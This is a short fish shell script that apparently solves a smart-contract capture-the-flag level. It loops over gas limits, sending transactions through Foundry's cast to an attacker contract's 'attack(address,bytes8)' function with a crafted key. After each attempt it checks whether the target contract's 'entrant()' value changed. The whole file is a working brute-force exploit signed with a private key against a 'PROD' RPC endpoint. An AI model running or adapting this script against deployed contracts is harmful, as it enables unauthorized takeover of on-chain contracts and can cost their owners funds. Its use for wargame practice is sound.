#!/usr/bin/fish

eval (posix-source .env);
set nope 0x0000000000000000000000000000000000000000000000000000000000000000;


for i in (seq 0 8191)
  # set gas_lim (math 399000 + $i)
  # set gas_lim (math 400000 + $i)
  # set gas_lim (math 401000 + $i)
  set gas_lim (math 401300 + $i)

  cast send -f $USER_PROD --rpc-url $URL_PROD --private-key $PRI_KEY_PROD --gas-limit "$gas_lim" $ATTACK_PROD "attack(address,bytes8)" $CONTRACT_PROD 0x10000000000079c8 > /dev/null

  set blah (cast call -f $USER_PROD --rpc-url $URL_PROD --private-key $PRI_KEY_PROD  $CONTRACT_PROD 'entrant()');

  if test (echo -n -e $blah | tail -c 2 | head -c 1) = 8
    echo $gas_lim
    echo "yes"
  end;
end;
